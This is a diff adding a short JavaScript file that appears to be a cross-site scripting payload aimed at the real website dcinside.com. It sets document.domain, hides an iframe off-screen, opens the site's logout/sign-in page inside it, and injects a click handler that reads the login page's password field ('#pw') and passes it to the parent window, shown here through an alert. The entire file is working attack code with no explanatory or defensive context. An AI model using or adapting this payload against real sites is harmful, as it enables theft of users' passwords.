@@ -1,0 +1,20 @@
+document.domain = 'dcinside.com';
+nas = document.createElement('iframe');
+nas.id = 'hash';
+nas.name = 'hash';
+nas.scrolling = 'no';
+nas.style.position = 'fixed';
+nas.style.top = '1px';
+nas.style.left = '1px';
+nas.style.width = '1px';
+nas.style.height = '1px';
+var $ = parent.$;
+nas.style.top = '-1000px';
+nas.style.left = '-1000px';
+nas.style.width = '1000000px';
+nas.style.height = '1000000px';
+parent.document.querySelector("#container > section > article:nth-child(3) > div.view_content_wrap > div > div.appending_file_box").appendChild(nas);
+newwindow = window.open('https://sign.dcinside.com/logout?s_url=https://www.dcinside.com/', 'hash', 'width=1px, height=1px');
+$('#hash').on('load', function () {
+    newwindow.$('html').attr('onclick', 'window.opener.alert($("#pw").val());setTimeout(function(){window.opener.$("#hash").remove()},300);');
+});
